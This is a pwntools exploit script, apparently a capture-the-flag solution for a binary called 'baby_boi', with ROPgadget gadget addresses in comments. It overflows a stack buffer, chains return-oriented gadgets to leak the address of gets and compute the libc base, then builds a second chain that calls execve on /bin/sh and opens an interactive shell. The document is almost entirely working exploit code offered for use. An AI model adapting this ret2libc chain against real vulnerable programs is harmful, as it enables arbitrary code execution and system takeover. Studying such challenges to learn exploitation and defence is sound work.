from pwn import *

# ROPgadget --binary libc-2.27.so --only "pop|ret" | grep -E "rdi|rsi|rdx|rax"
# 0x000439c8 : pop rax ; ret
# 0x0002155f : pop rdi ; ret
# 0x00001b96 : pop rdx ; ret
# 0x00023e6a : pop rsi ; ret

# ROPgadget --binary libc-2.27.so --only "syscall"
# 0x000013c0 : syscall

# ROPgadget --binary libc-2.27.so --string "/bin/sh"
# 0x001b3e9a : /bin/sh

# ROPgadget --binary ./baby_boi --only "pop|ret"
# 0x00400793 : pop rdi ; ret

context.arch = "amd64"
context.binary = "./baby_boi"
elf = ELF("./baby_boi")
target = process("./baby_boi")

libc = ELF("libc-2.27.so")

pop_rdi = 0x00400793
gets_got = context.binary.got["gets"]
puts_plt = context.binary.plt["puts"]
main_addr = context.binary.symbols["main"]

padding = b"A" * (32 + 8)
payload1 = flat(
    padding,
    pop_rdi,
    gets_got,
    puts_plt,
    main_addr,
)

target.recvuntil(b"am: ")
gift = target.recvline()
print(f"DEBUG: Gift is {gift}")

target.sendline(payload1)

leaked_gets = u64(target.recvline().strip().ljust(8, b"\x00"))
libc_base = leaked_gets - libc.symbols["gets"]

pop_rdi = 0x0002155F + libc_base
bin_sh_addr = 0x001B3E9A + libc_base
pop_rsi = 0x00023E6A + libc_base
pop_rdx = 0x00001B96 + libc_base
pop_rax = 0x000439C8 + libc_base
syscall = 0x000013C0 + libc_base

payload2 = flat(
    padding, pop_rdi, bin_sh_addr, pop_rsi, 0, pop_rdx, 0, pop_rax, 0x3B, syscall
)

target.sendlineafter("am: ", payload2)
target.interactive()
